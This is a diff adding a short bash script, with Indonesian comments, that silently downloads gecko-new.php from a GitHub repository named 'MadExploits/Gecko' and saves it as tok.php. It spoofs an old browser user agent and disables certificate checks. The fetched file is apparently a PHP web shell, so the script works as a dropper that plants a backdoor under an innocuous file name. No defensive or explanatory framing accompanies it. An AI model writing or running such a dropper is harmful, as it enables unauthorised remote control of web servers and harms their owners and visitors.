@@ -1,0 +1,20 @@
+#!/bin/bash
+
+# Script Bash untuk melakukan curl dan menyimpan hasilnya ke tok.php
+
+# URL target
+URL="https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php"
+
+# Lakukan curl dengan options yang sesuai
+curl -s -L -k \
+     -A "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0" \
+     -o "tok.php" \
+     "$URL"
+
+# Cek apakah curl berhasil
+if [ $? -eq 0 ]; then
+    echo "Berhasil menyimpan konten ke tok.php"
+else
+    echo "Gagal melakukan curl"
+    exit 1
+fi
